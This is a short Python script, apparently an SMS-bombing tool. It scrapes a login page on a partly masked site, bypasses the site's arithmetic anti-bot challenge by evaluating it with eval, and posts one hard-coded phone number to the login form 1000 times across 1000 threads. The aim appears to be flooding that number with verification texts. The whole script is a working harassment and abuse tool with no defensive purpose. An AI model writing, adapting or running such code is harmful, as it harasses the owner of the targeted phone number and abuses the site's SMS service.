import requests
import concurrent.futures
import random
from bs4 import BeautifulSoup


def send_sms(num1):
    
    session=requests.Session()
    url="https://aladin*******p.com/login"

    response=session.get(url)

    r=BeautifulSoup(response.content,features="lxml")

    challenge_input=r.find('input',{"name":"frf_calculatereg"})
    challenge=challenge_input.parent.parent
    challenge=challenge.select_one('td').string
    chal=challenge
    challenge=challenge.replace(' ','').replace('=','').strip()
    challenge_ans=eval(challenge)
    print(chal,challenge_ans)
    
    phone_num='0181'+str(random.randint(2123456,2999999))
    phone_num='01927445025'
    response=session.post(url,data={
        "f_mobilenumber":phone_num,
        "frf_calculatereg":challenge_ans

    })


    print(str(num1)+"->"+str(response.status_code)+": "+phone_num)

with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
        executor.map(send_sms,range(1000))
